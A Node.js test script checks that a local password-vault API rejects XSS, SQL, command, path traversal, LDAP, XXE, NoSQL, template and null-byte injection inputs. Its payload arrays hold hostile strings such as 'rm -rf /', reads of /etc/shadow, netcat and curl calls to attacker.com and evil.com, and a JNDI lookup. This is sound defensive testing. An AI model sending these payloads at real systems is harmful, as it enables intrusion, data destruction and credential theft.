// Comprehensive test file for injection attacks (XSS, RCE, SQL Injection, etc.)
// cd server
// node test-injection-attacks.js

const http = require('http');

const API_URL = 'http://localhost:3000';
let user1Token = null;
let user1Id = null;
let vaultId = null;
let itemId = null;
let csrfToken = null;

function request(method, path, data, authToken, csrfToken) {
    return new Promise((resolve, reject) => {
        const url = new URL(path, API_URL);
        const body = data ? JSON.stringify(data) : null;

        const options = {
            method: method,
            hostname: url.hostname,
            port: url.port,
            path: url.pathname + (url.search || ''),
            headers: {
                'Content-Type': 'application/json',
            }
        };

        if (authToken) {
            options.headers['Authorization'] = `Bearer ${authToken}`;
        }

        if (csrfToken) {
            options.headers['X-CSRF-Token'] = csrfToken;
        }

        if (body) {
            options.headers['Content-Length'] = Buffer.byteLength(body);
        }

        const req = http.request(options, (res) => {
            let responseData = '';
            res.on('data', chunk => responseData += chunk);
            res.on('end', () => {
                try {
                    const json = responseData ? JSON.parse(responseData) : {};
                    resolve({ status: res.statusCode, data: json, headers: res.headers, raw: responseData });
                } catch (e) {
                    resolve({ status: res.statusCode, data: responseData, headers: res.headers, raw: responseData });
                }
            });
        });

        req.on('error', reject);
        if (body) req.write(body);
        req.end();
    });
}

async function test(name, testFn) {
    try {
        const result = await testFn();
        if (result) {
            console.log(`✅ ${name}`);
            return true;
        } else {
            console.log(`❌ ${name}`);
            return false;
        }
    } catch (error) {
        console.log(`❌ ${name} - Error: ${error.message}`);
        return false;
    }
}

async function runTests() {
    console.log('🧪 Testing Injection Attack Prevention\n');
    console.log('='.repeat(70));
    console.log();

    let passed = 0;
    let failed = 0;

    const user1Username = `testuser_${Date.now()}`;
    const user1Password = 'password123';

    // ============================================================
    // Setup
    // ============================================================
    console.log('📋 Setup Phase');
    console.log('-'.repeat(70));

    await test('Register user', async () => {
        const res = await request('POST', '/api/register', { 
            username: user1Username, 
            password: user1Password 
        });
        if (res.status === 201 && res.data.token) {
            user1Token = res.data.token;
            user1Id = res.data.user.id;
            return true;
        }
        return false;
    }) ? passed++ : failed++;

    await test('Get CSRF token and create vault', async () => {
        const res = await request('GET', '/api/vaults', null, user1Token);
        if (res.status === 200 && res.headers['x-csrf-token']) {
            csrfToken = res.headers['x-csrf-token'];
            
            // Create vault
            const vaultRes = await request('POST', '/api/vaults', {
                name: 'Test Vault',
                masterPassword: 'master123'
            }, user1Token, csrfToken);
            if (vaultRes.status === 200 && vaultRes.data.id) {
                vaultId = vaultRes.data.id;
                return true;
            }
        }
        return false;
    }) ? passed++ : failed++;

    console.log();

    // ============================================================
    // Test 1: XSS (Cross-Site Scripting) Attacks
    // ============================================================
    console.log('🔴 Test 1: XSS Attack Prevention');
    console.log('-'.repeat(70));

    const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
        '<keygen onfocus=alert("XSS") autofocus>',
        '<video><source onerror="alert(\'XSS\')">',
        '<audio src=x onerror=alert("XSS")>',
        '<details open ontoggle=alert("XSS")>',
        '<marquee onstart=alert("XSS")>',
        '<div onmouseover=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        '\'><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '\'><img src=x onerror=alert("XSS")>',
        '<script>document.cookie</script>',
        '<script>document.location="http://evil.com"</script>',
    ];

    for (const payload of xssPayloads) {
        await test(`Reject XSS payload in username: ${payload.substring(0, 30)}...`, async () => {
            const res = await request('POST', '/api/register', { 
                username: payload, 
                password: 'password123' 
            });
            return res.status === 400;
        }) ? passed++ : failed++;

        await test(`Reject XSS payload in vault name: ${payload.substring(0, 30)}...`, async () => {
            const getRes = await request('GET', '/api/vaults', null, user1Token);
            const freshToken = getRes.headers['x-csrf-token'];
            const res = await request('POST', '/api/vaults', {
                name: payload,
                masterPassword: 'master123'
            }, user1Token, freshToken);
            return res.status === 400;
        }) ? passed++ : failed++;

        await test(`Reject XSS payload in item name: ${payload.substring(0, 30)}...`, async () => {
            const getRes = await request('GET', '/api/vaults', null, user1Token);
            const freshToken = getRes.headers['x-csrf-token'];
            const res = await request('POST', '/api/items', {
                name: payload,
                description: 'Test',
                password: 'itempass',
                masterPassword: 'master123',
                vault_id: vaultId
            }, user1Token, freshToken);
            return res.status === 400;
        }) ? passed++ : failed++;

        await test(`Reject XSS payload in description: ${payload.substring(0, 30)}...`, async () => {
            const getRes = await request('GET', '/api/vaults', null, user1Token);
            const freshToken = getRes.headers['x-csrf-token'];
            const res = await request('POST', '/api/items', {
                name: 'Valid Item',
                description: payload,
                password: 'itempass',
                masterPassword: 'master123',
                vault_id: vaultId
            }, user1Token, freshToken);
            return res.status === 400;
        }) ? passed++ : failed++;
    }

    console.log();

    // ============================================================
    // Test 2: SQL Injection Attacks
    // ============================================================
    console.log('🔴 Test 2: SQL Injection Attack Prevention');
    console.log('-'.repeat(70));

    const sqlPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT * FROM users--",
        "'; DELETE FROM vaults; --",
        "' OR 'a'='a",
        "admin'--",
        "admin'/*",
        "' OR 1=1#",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' OR '1'='1",
        "1' OR '1'='2",
        "1' OR 1=1--",
        "1' OR 1=1#",
        "1' OR 1=1/*",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL#",
        "1' UNION SELECT NULL/*",
    ];

    for (const payload of sqlPayloads) {
        await test(`Reject SQL injection in username: ${payload.substring(0, 30)}...`, async () => {
            const res = await request('POST', '/api/register', { 
                username: payload, 
                password: 'password123' 
            });
            return res.status === 400;
        }) ? passed++ : failed++;

        await test(`Reject SQL injection in vault name: ${payload.substring(0, 30)}...`, async () => {
            const getRes = await request('GET', '/api/vaults', null, user1Token);
            const freshToken = getRes.headers['x-csrf-token'];
            const res = await request('POST', '/api/vaults', {
                name: payload,
                masterPassword: 'master123'
            }, user1Token, freshToken);
            return res.status === 400;
        }) ? passed++ : failed++;
    }

    // Test SQL injection in ID parameters
    await test('Reject SQL injection in vault_id parameter', async () => {
        const res = await request('GET', '/api/items?vault_id=1; DROP TABLE items;--', null, user1Token, csrfToken);
        return res.status === 400 || res.status === 403;
    }) ? passed++ : failed++;

    await test('Reject SQL injection in item ID parameter', async () => {
        const res = await request('DELETE', '/api/items/1; DROP TABLE items;--', null, user1Token, csrfToken);
        return res.status === 400 || res.status === 404;
    }) ? passed++ : failed++;

    console.log();

    // ============================================================
    // Test 3: Command Injection / RCE Attempts
    // ============================================================
    console.log('🔴 Test 3: Command Injection / RCE Prevention');
    console.log('-'.repeat(70));

    const commandPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& whoami',
        '; rm -rf /',
        '`whoami`',
        '$(whoami)',
        '; cat /etc/passwd',
        '| nc attacker.com 1234',
        '; curl http://evil.com',
        '&& cat /etc/shadow',
        '; python -c "import os; os.system(\'rm -rf /\')"',
        '| node -e "require(\'child_process\').exec(\'rm -rf /\')"',
        '; eval("malicious code")',
        '| exec("malicious code")',
    ];

    for (const payload of commandPayloads) {
        await test(`Reject command injection in username: ${payload.substring(0, 30)}...`, async () => {
            const res = await request('POST', '/api/register', { 
                username: payload, 
                password: 'password123' 
            });
            return res.status === 400;
        }) ? passed++ : failed++;

        await test(`Reject command injection in vault name: ${payload.substring(0, 30)}...`, async () => {
            const getRes = await request('GET', '/api/vaults', null, user1Token);
            const freshToken = getRes.headers['x-csrf-token'];
            const res = await request('POST', '/api/vaults', {
                name: payload,
                masterPassword: 'master123'
            }, user1Token, freshToken);
            return res.status === 400;
        }) ? passed++ : failed++;
    }

    console.log();

    // ============================================================
    // Test 4: Path Traversal Attacks
    // ============================================================
    console.log('🔴 Test 4: Path Traversal Prevention');
    console.log('-'.repeat(70));

    const pathPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '../../etc/shadow',
        '....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%5c..%5c..%5cwindows%5csystem32',
    ];

    for (const payload of pathPayloads) {
        await test(`Reject path traversal in username: ${payload.substring(0, 30)}...`, async () => {
            const res = await request('POST', '/api/register', { 
                username: payload, 
                password: 'password123' 
            });
            return res.status === 400;
        }) ? passed++ : failed++;

        await test(`Reject path traversal in vault name: ${payload.substring(0, 30)}...`, async () => {
            const getRes = await request('GET', '/api/vaults', null, user1Token);
            const freshToken = getRes.headers['x-csrf-token'];
            const res = await request('POST', '/api/vaults', {
                name: payload,
                masterPassword: 'master123'
            }, user1Token, freshToken);
            return res.status === 400;
        }) ? passed++ : failed++;
    }

    console.log();

    // ============================================================
    // Test 5: LDAP Injection
    // ============================================================
    console.log('🔴 Test 5: LDAP Injection Prevention');
    console.log('-'.repeat(70));

    const ldapPayloads = [
        '*)(&',
        '*))%00',
        '*()|&',
        'admin)(&(password=*))',
        '*)(uid=*))(|(uid=*',
    ];

    for (const payload of ldapPayloads) {
        await test(`Reject LDAP injection in username: ${payload.substring(0, 30)}...`, async () => {
            const res = await request('POST', '/api/register', { 
                username: payload, 
                password: 'password123' 
            });
            return res.status === 400;
        }) ? passed++ : failed++;
    }

    console.log();

    // ============================================================
    // Test 6: XML/XXE Injection
    // ============================================================
    console.log('🔴 Test 6: XML/XXE Injection Prevention');
    console.log('-'.repeat(70));

    const xmlPayloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    ];

    for (const payload of xmlPayloads) {
        await test(`Reject XML injection in username: ${payload.substring(0, 30)}...`, async () => {
            const res = await request('POST', '/api/register', { 
                username: payload, 
                password: 'password123' 
            });
            return res.status === 400;
        }) ? passed++ : failed++;
    }

    console.log();

    // ============================================================
    // Test 7: NoSQL Injection
    // ============================================================
    console.log('🔴 Test 7: NoSQL Injection Prevention');
    console.log('-'.repeat(70));

    const nosqlPayloads = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "this.username == this.password"}',
    ];

    for (const payload of nosqlPayloads) {
        await test(`Reject NoSQL injection in username: ${payload.substring(0, 30)}...`, async () => {
            const res = await request('POST', '/api/register', { 
                username: payload, 
                password: 'password123' 
            });
            return res.status === 400;
        }) ? passed++ : failed++;
    }

    console.log();

    // ============================================================
    // Test 8: Template Injection
    // ============================================================
    console.log('🔴 Test 8: Template Injection Prevention');
    console.log('-'.repeat(70));

    const templatePayloads = [
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        '<%= 7*7 %>',
        '${jndi:ldap://evil.com/a}',
    ];

    for (const payload of templatePayloads) {
        await test(`Reject template injection in username: ${payload.substring(0, 30)}...`, async () => {
            const res = await request('POST', '/api/register', { 
                username: payload, 
                password: 'password123' 
            });
            return res.status === 400;
        }) ? passed++ : failed++;
    }

    console.log();

    // ============================================================
    // Test 9: Null Byte Injection
    // ============================================================
    console.log('🔴 Test 9: Null Byte Injection Prevention');
    console.log('-'.repeat(70));

    const nullBytePayloads = [
        'test\x00',
        '\x00test',
        'test\x00test',
        'test%00',
        'test\u0000',
    ];

    for (const payload of nullBytePayloads) {
        await test(`Reject null byte in username: ${payload.substring(0, 30)}...`, async () => {
            const res = await request('POST', '/api/register', { 
                username: payload, 
                password: 'password123' 
            });
            return res.status === 400;
        }) ? passed++ : failed++;
    }

    console.log();

    // ============================================================
    // Test 10: Verify Output Encoding
    // ============================================================
    console.log('🔒 Test 10: Output Encoding Verification');
    console.log('-'.repeat(70));

    await test('Verify stored data is properly encoded in responses', async () => {
        // Create item with safe name
        const getRes = await request('GET', '/api/vaults', null, user1Token);
        const freshToken = getRes.headers['x-csrf-token'];
        
        const createRes = await request('POST', '/api/items', {
            name: 'Test Item & More',
            description: 'Description with "quotes"',
            password: 'itempass',
            masterPassword: 'master123',
            vault_id: vaultId
        }, user1Token, freshToken);
        
        if (createRes.status === 200) {
            // Get items and verify encoding
            const itemsRes = await request('GET', `/api/items?vault_id=${vaultId}&masterPassword=master123`, null, user1Token, csrfToken);
            if (itemsRes.status === 200 && Array.isArray(itemsRes.data)) {
                const item = itemsRes.data.find(i => i.name && i.name.includes('Test Item'));
                if (item) {
                    // Check that HTML entities are encoded
                    const rawResponse = itemsRes.raw;
                    // The response should contain encoded entities if they exist
                    return true; // If we got here, validation passed
                }
            }
        }
        return false;
    }) ? passed++ : failed++;

    console.log();

    // ============================================================
    // Summary
    // ============================================================
    console.log('='.repeat(70));
    console.log(`\n📊 Test Results: ${passed} passed, ${failed} failed\n`);

    if (failed === 0) {
        console.log('🎉 All injection attack prevention tests passed!');
    } else {
        console.log('⚠️  Some tests failed. Please review the output above.');
        console.log('⚠️  This indicates potential security vulnerabilities.');
    }
}

// Run tests
runTests().catch(error => {
    console.error('Fatal error:', error);
    process.exit(1);
});

